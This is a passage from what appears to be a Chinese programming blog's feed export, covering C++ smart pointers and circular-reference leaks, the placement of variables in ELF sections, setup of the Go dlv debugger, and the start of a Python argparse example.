<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple %d\n&quot;</span>, m_a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple func \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">            m_a = n;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">const</span> Simple&amp; p) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Copy Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ~<span class="built_in">Simple</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unique_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// unique ptr</span></span><br><span class="line">    <span class="keyword">auto</span> s_ptr = std::<span class="built_in">make_unique</span>&lt;Simple&gt;(<span class="number">1</span>);</span><br><span class="line">    s_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    std::unique_ptr&lt;Simple&gt; s_copy_ptr = std::<span class="built_in">move</span>(s_ptr);</span><br><span class="line">    s_copy_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Simple&gt; s_ptr_2(s_ptr);   // 无法编译通过</span></span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Simple&gt; s_ptr_2 = s_ptr;  // 无法编译通过</span></span><br><span class="line">    s_ptr-&gt;<span class="built_in">showfunc</span>();</span><br><span class="line">    <span class="comment">//s_ptr-&gt;Show();    // 当所有权变更后就不该再用之前的指针访问对象资源。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>unique_ptr</code>禁用拷贝构造<br>  由于<code>unique_ptr</code>禁用了拷贝构造函数<code>unique_ptr(const unique_ptr&amp;) = delete;</code>，所以一切试图触发拷贝构造函数的操作都会引发编译错误。</li>
<li><code>unique_ptr</code>所有权一旦变更就不能使用原指针访问对象资源<br>  上述代码中有两处使用了原指针访问对象资源，第一处<code>s_ptr-&gt;showfunc();</code>没有报错，可以正常打印；<code>s_ptr-&gt;Show();</code>中使用到了成员变量<code>m_a</code>所以会导致报错“<code>this</code>空指针”。这是由于<code>std::move</code>的赋值操作触发了<code>unique_ptr</code>中的Move构造函数(<code>unique_ptr(unique_ptr&amp;&amp;) = default;</code>)，从而将<code>s_ptr</code>中的成员清空。所以再次访问原对象指针，就会出错。</li>
</ul>
<h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="shared_ptr"></a>shared_ptr</h2><p><img src="/images/cpp/shared_ptr.png" alt="shared_ptr"></p>
<p><code>shared_ptr</code>采用的是引用计数的机制来控制对象的销毁时机。如其名字所示，其对象是共享的。当计数器等于0是，调用对象的析构函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test_inner</span><span class="params">(std::shared_ptr&lt;Simple&gt; *steal_ptr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// share ptr</span></span><br><span class="line">    <span class="keyword">auto</span> s_ptr = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">1</span>);</span><br><span class="line">    s_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="function">std::shared_ptr&lt;Simple&gt; <span class="title">s_copy_ptr</span><span class="params">(s_ptr)</span></span>;</span><br><span class="line">    s_copy_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    std::shared_ptr&lt;Simple&gt; s_ptr_2 = s_ptr;</span><br><span class="line">    s_ptr_2-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="comment">// try steal</span></span><br><span class="line">    *steal_ptr = s_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">shared_test_leak</span>();</span><br><span class="line">    std::shared_ptr&lt;Simple&gt; s_ptr;</span><br><span class="line">    <span class="built_in">shared_test_inner</span>(&amp;s_ptr);</span><br><span class="line">    s_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尽可能使用<code>make_shared</code>创建<code>shared_ptr</code>，如果使用<code>std::shared_ptr&lt;Simple&gt; s_ptr(new Simple(1))</code>创建<code>shared_ptr</code>，需要分配两次内存，一次是<code>new Simple(1)</code>；另一次是<code>shared_ptr</code>的引用计数。<code>make_shared</code>只分配一次。</p>
<p>现在创建一个<code>SimpleBack</code>类，然后再让<code>Simple</code>和<code>SimpleBack</code>循环引用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple %d\n&quot;</span>, m_a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple func \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">            m_a = n;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">const</span> Simple&amp; p) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Copy Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ~<span class="built_in">Simple</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        std::shared_ptr&lt;SimpleBack&gt; m_sb;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        std::shared_ptr&lt;Simple&gt; m_s;</span><br><span class="line">        ~<span class="built_in">SimpleBack</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SimpleBack Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> s = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">auto</span> sb = std::<span class="built_in">make_shared</span>&lt;SimpleBack&gt;();</span><br><span class="line"></span><br><span class="line">    s-&gt;m_sb = sb;</span><br><span class="line">    sb-&gt;m_s = s;</span><br><span class="line">    <span class="comment">// 通过打印语句可以看到 s和sb的析构函数并没有调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过析构函数函数的打印语句可以看出<code>s</code>和<code>sb</code>并没有被析构，这说明<code>s</code>和<code>sb</code>泄漏了。</p>
<p>为了解决<code>shared_ptr</code>在循环依赖中内存泄漏的问题，推出了<code>weak_ptr</code>。</p>
<h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="weak_ptr"></a>weak_ptr</h2><p><code>weak_ptr</code>不会增加引用计数，不能直接操作对象的内存（需要先调用<code>lock</code>接口），需要和<code>shared_ptr</code>配套使用。</p>
<p>将上述代码改成这样：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple %d\n&quot;</span>, m_a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple func \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">            m_a = n;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">const</span> Simple&amp; p) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Copy Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ~<span class="built_in">Simple</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        std::shared_ptr&lt;SimpleBack&gt; m_sb;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 将循环引用的其中一个改成weak_ptr</span></span><br><span class="line">        std::weak_ptr&lt;Simple&gt; m_s;</span><br><span class="line">        ~<span class="built_in">SimpleBack</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SimpleBack Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> s = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">auto</span> sb = std::<span class="built_in">make_shared</span>&lt;SimpleBack&gt;();</span><br><span class="line"></span><br><span class="line">    s-&gt;m_sb = sb;</span><br><span class="line">    sb-&gt;m_s = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过析构函数的打印语句可以看出，<code>s</code>和<code>sb</code>的析构函数在<code>shared_test_lead()</code>调用结束后被调用。</p>
<p>那么，<code>weak_ptr</code>的使用是不是也像<code>shared_ptr</code>一样呢？不是的。<code>weak_ptr</code>需要与<code>shared_ptr</code>配合使用，看一个例子。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">weak_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::weak_ptr&lt;Simple&gt; w;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> s = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">3</span>);</span><br><span class="line">        w = s;</span><br><span class="line">        <span class="keyword">auto</span> s2 = w.<span class="built_in">lock</span>();</span><br><span class="line">        <span class="keyword">if</span>(s2 != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            s2-&gt;<span class="built_in">Show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(w.<span class="built_in">expired</span>()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;object &#x27;s&#x27; is destroied. \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lock</code><br>  若对象已被析构，则返回一个空的<code>shared_ptr</code>；否则返回实际的<code>shared_ptr</code>。</li>
<li><code>expired</code><br>  若对象已被析构，则返回<code>true</code>；否则返回<code>false</code></li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://senlinzhan.github.io/2015/04/24/%E6%B7%B1%E5%85%A5shared-ptr/">谈谈 shared_ptr 的那些坑</a></li>
<li><a href="https://www.jianshu.com/p/cb3e574eee5f">智能指针的线程安全</a></li>
<li><a href="https://blog.csdn.net/qingdujun/article/details/74858071">C++14 智能指针unique_ptr、shared_ptr、weak_ptr</a></li>
<li><a href="https://www.cnblogs.com/Solstice/archive/2013/01/28/2879366.html">为什么多线程读写 shared_ptr 要加锁？</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>变量及函数在内存中的位置</title>
    <url>/2021/09/27/language/cpp/variable-in-elf/</url>
    <content><![CDATA[<p>从一个CPP文件编译成ELF可执行文件过程中会把不同的变量和函数映射到不同的内存区域。这些不同的区域具有不同的访问权限，有的是只读的，有的是读写的，有的是可执行的。让我们举个简单的例子来了解一下。</p>
<p>示例代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> dst_type,<span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function">dst_type <span class="title">pointer_cast</span><span class="params">(src_type src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">static_cast</span>&lt;dst_type*&gt;(<span class="built_in">static_cast</span>&lt;<span class="type">void</span>*&gt;(&amp;src));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">255</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> const_global_int = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just a function\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">static_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">inline_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="type">pfunc_t</span>)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="type">main_func_t</span>)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="type">static_func_t</span>)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am Show...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">localshow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am localshow...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> local_uninit_var;</span><br><span class="line">    <span class="type">int</span> local_init_var = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> const_local_int = <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>* heap_int = <span class="keyword">new</span> <span class="built_in">int</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">pfunc_t</span> pf = func;</span><br><span class="line">    <span class="type">main_func_t</span> mf = main;</span><br><span class="line">    <span class="type">static_func_t</span> sf = static_func;</span><br><span class="line">    <span class="type">static_func_t</span> csf = Simple::Show;</span><br><span class="line">    <span class="type">void</span>* cpf = <span class="built_in">pointer_cast</span>&lt;<span class="type">void</span>*&gt;(&amp;Simple::localshow);</span><br><span class="line">    <span class="type">pfunc_t</span> ipf = inline_func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_uninit_var: 0x%x\n&quot;</span>, &amp;global_uninit_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_init_var: 0x%x\n&quot;</span>, &amp;global_init_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;static_var: 0x%x\n&quot;</span>, &amp;static_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;const_global_int: 0x%x\n&quot;</span>, &amp;const_global_int);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;local_uninit_var: 0x%x\n&quot;</span>, &amp;local_uninit_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;local_init_var: 0x%x\n&quot;</span>, &amp;local_init_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;const_local_int: 0x%x\n&quot;</span>, &amp;const_local_int);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_int: 0x%x, 0x%x\n&quot;</span>, &amp;heap_int, heap_int);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point_func: 0x%x, 0x%x\n&quot;</span>, &amp;pf, pf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point_main_func: 0x%x, 0x%x\n&quot;</span>, &amp;mf, mf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;static_func: 0x%x, 0x%x\n&quot;</span>, &amp;sf, sf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;class_static_func: 0x%x, 0x%x\n&quot;</span>, &amp;csf, csf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;class_local_func: 0x%x, 0x%x\n&quot;</span>, &amp;cpf, cpf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inline_func: 0x%x, 0x%x\n&quot;</span>, &amp;ipf, ipf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于ELF格式中有很多信息，我们只取<code>readelf --sections</code>相关信息<br>ELF结构如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Nr] Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">[ 0]                   NULL             0000000000000000  00000000       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">[ 1] .interp           PROGBITS         00000000004002a8  000002a8       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">[ 2] .note.gnu.bu[...] NOTE             00000000004002c4  000002c4       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">[ 3] .note.ABI-tag     NOTE             00000000004002e8  000002e8       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">[ 4] .gnu.hash         GNU_HASH         0000000000400308  00000308       000000000000001c  0000000000000000   A       5     0     8</span><br><span class="line">[ 5] .dynsym           DYNSYM           0000000000400328  00000328       0000000000000090  0000000000000018   A       6     1     8</span><br><span class="line">[ 6] .dynstr           STRTAB           00000000004003b8  000003b8       000000000000007d  0000000000000000   A       0     0     1</span><br><span class="line">[ 7] .gnu.version      VERSYM           0000000000400436  00000436       000000000000000c  0000000000000002   A       5     0     2</span><br><span class="line">[ 8] .gnu.version_r    VERNEED          0000000000400448  00000448       0000000000000040  0000000000000000   A       6     2     8</span><br><span class="line">[ 9] .rela.dyn         RELA             0000000000400488  00000488       0000000000000018  0000000000000018   A       5     0     8</span><br><span class="line">[10] .rela.plt         RELA             00000000004004a0  000004a0       0000000000000078  0000000000000018  AI       5    22     8</span><br><span class="line">[11] .init             PROGBITS         0000000000401000  00001000       000000000000001a  0000000000000000  AX       0     0     4</span><br><span class="line">[12] .plt              PROGBITS         0000000000401020  00001020       0000000000000060  0000000000000010  AX       0     0     16</span><br><span class="line">[13] .text             PROGBITS         0000000000401080  00001080       0000000000000392  0000000000000000  AX       0     0     16</span><br><span class="line">[14] .fini             PROGBITS         0000000000401414  00001414       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">[15] .rodata           PROGBITS         0000000000402000  00002000       000000000000019e  0000000000000000   A       0     0     8</span><br><span class="line">[16] .eh_frame_hdr     PROGBITS         00000000004021a0  000021a0       0000000000000064  0000000000000000   A       0     0     4</span><br><span class="line">[17] .eh_frame         PROGBITS         0000000000402208  00002208       00000000000001b8  0000000000000000   A       0     0     8</span><br><span class="line">[18] .init_array       INIT_ARRAY       0000000000403de8  00002de8       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">[19] .fini_array       FINI_ARRAY       0000000000403df0  00002df0       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">[20] .dynamic          DYNAMIC          0000000000403df8  00002df8       0000000000000200  0000000000000010  WA       6     0     8</span><br><span class="line">[21] .got              PROGBITS         0000000000403ff8  00002ff8       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">[22] .got.plt          PROGBITS         0000000000404000  00003000       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line">[23] .data             PROGBITS         0000000000404040  00003040       000000000000000c  0000000000000000  WA       0     0     4</span><br><span class="line">[24] .bss              NOBITS           000000000040404c  0000304c       000000000000000c  0000000000000000  WA       0     0     4</span><br><span class="line">[25] .comment          PROGBITS         0000000000000000  0000304c       000000000000005c  0000000000000001  MS       0     0     1</span><br><span class="line">[26] .debug_aranges    PROGBITS         0000000000000000  000030a8       0000000000000070  0000000000000000           0     0     1</span><br><span class="line">[27] .debug_info       PROGBITS         0000000000000000  00003118       000000000000031a  0000000000000000           0     0     1</span><br><span class="line">[28] .debug_abbrev     PROGBITS         0000000000000000  00003432       00000000000001d9  0000000000000000           0     0     1</span><br><span class="line">[29] .debug_line       PROGBITS         0000000000000000  0000360b       0000000000000114  0000000000000000           0     0     1</span><br><span class="line">[30] .debug_str        PROGBITS         0000000000000000  0000371f       0000000000000235  0000000000000001  MS       0     0     1</span><br><span class="line">[31] .debug_ranges     PROGBITS         0000000000000000  00003954       0000000000000060  0000000000000000           0     0     1</span><br><span class="line">[32] .symtab           SYMTAB           0000000000000000  000039b8       0000000000000750  0000000000000018          33    52     8</span><br><span class="line">[33] .strtab           STRTAB           0000000000000000  00004108       0000000000000298  0000000000000000           0     0     1</span><br><span class="line">[34] .shstrtab         STRTAB           0000000000000000  000043a0       0000000000000151  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure>

<p>将上述代码编译运行打印出的结果对应到elf格式中相应的区域如下：</p>
<p><img src="/images/cpp/variable.png" alt="variable"></p>
<ul>
<li>所有代码无聊作何标记全部存储在<code>.text</code>段，换句话说从汇编的角度可以调用任何函数都可以被调用</li>
<li>全局的<code>const</code>常量存放在<code>.rodata</code>段</li>
<li>局部的<code>const</code>常量则存储在栈空间内，而常量的右值<code>127</code>则存放在<code>.text</code>段</li>
<li>已经初始化的全局变量或<code>static</code>变量存放在<code>.data</code>段</li>
<li>未初始化的全局变量存放在<code>bss</code>段</li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang Debug工具集</title>
    <url>/2019/12/12/language/golang/golang-debug-tools/</url>
    <content><![CDATA[<p>没钱、没钱、没钱，重要的事情说三遍，因为没钱，所以买不起正版的golang IDE，只能使用免费的轻量级的工具完成golang开发任务。</p>
<p>那么，Coding可以使用vim。debug呢？以前用gdb，据说出了个dlv，据说这个dlv可以调试goroutine。抱着试试看的心态尝试一下。</p>
<h1 id="dlv"><a href="#dlv" class="headerlink" title="dlv"></a>dlv</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get -u github.com/derekparker/delve/cmd/dlv</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置文件在<code>~/.dlv/config.yml</code>，推荐修改其中的<code>max-string-len</code>，此配置为debug时，查看<code>string</code>变量的内容，最大显示多长，对于一些超长的字符串，会显示不下。所以为了看到更为完整的内容，建议将其设置为<code>max-string-len: 640</code>。</p>
<p>当然，此配置也可以在debug过程中动态修改，详细请见<code>help</code>中的<code>config</code>命令。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>启动dlv</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dlv debug *.go</span><br></pre></td></tr></table></figure>
<p>进入交互界面后，可以使用<code>help</code>查看命令，<code>b</code>设置断点，<code>l</code>list代码，基本使用与gdb很相似，如此用户体验还是不错的。</p>
<h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><p>Todo…</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jb51.net/article/158885.htm">Golang命令行进行debug调试操作</a></li>
<li><a href="https://blog.csdn.net/weixin_30478757/article/details/97514330">golang的dlv调试工具print打印字符串显示more,无法显示更多</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>python-argparse-use</title>
    <url>/2016/11/15/language/python/python-argparse-use/</url>
    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">args = <span class="string">&quot;-f hello.txt -n 1 2 3 -x 100 -y b -z a -q hello @args.txt i_am_bar -h&quot;</span>.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用@args.txt要求fromfile_prefix_chars=&quot;@&quot;</span></span><br><span class="line"><span class="comment"># args.txt文件中应该一行一个参数，想改变行为参考convert_arg_line_to_args()</span></span><br><span class="line"><span class="comment"># ArgumentParser参数的简单说明</span></span><br><span class="line"><span class="comment">## description - 命令行帮助的开始文字，大部分情况下，我们只会用到这个参数</span></span><br><span class="line"><span class="comment"># epilog - 命令行帮助的结尾文字</span></span><br><span class="line"><span class="comment"># prog - (default: sys.argv[0])程序的名字，一般不需要修改，另外，如果你需要在help中使用到程序的名字，可以使用%(prog)s</span></span><br><span class="line"><span class="comment"># prefix_chars - 命令的前缀，默认是-，例如-f/--file。有些程序可能希望支持/f这样的选项，可以使用prefix_chars=&quot;/&quot;</span></span><br><span class="line"><span class="comment"># fromfile_prefix_chars - (default: None)如果你希望命令行参数可以从文件中读取，就可能用到。例如，如果fromfile_prefix_chars=&#x27;@&#x27;,命令行参数中有一个为&quot;@args.txt&quot;，args.txt的内容会作为命令行参数</span></span><br><span class="line"><span class="comment"># add_help - 是否增加-h/-help选项 (default: True)，一般help信息都是必须的，所以不用设置啦。</span></span><br><span class="line"><span class="comment">## parents - 类型是list，如果这个parser的一些选项跟其他某些parser的选项一样，可以用parents来实现继承，例如parents=[parent_parser]</span></span><br><span class="line"><span class="comment">## formatter_class - 自定义帮助信息的格式（description和epilog）。默认情况下会将长的帮助信息进行&lt;自动换行和消除多个连续空白&gt;。</span></span><br><span class="line"><span class="comment">#三个允许的值：</span></span><br><span class="line"><span class="comment"># class argparse.RawDescriptionHelpFormatter 直接输出description和epilog的原始形式（不进行自动换行和消除空白的操作）</span></span><br><span class="line"><span class="comment"># class argparse.RawTextHelpFormatter 直接输出description和epilog以及add_argument中的help字符串的原始形式（不进行自动换行和消除空白的操作）</span></span><br><span class="line"><span class="comment">## class argparse.ArgumentDefaultsHelpFormatter 在每个选项的帮助信息后面输出他们对应的缺省值，如果有设置的话。这个最常用吧！</span></span><br><span 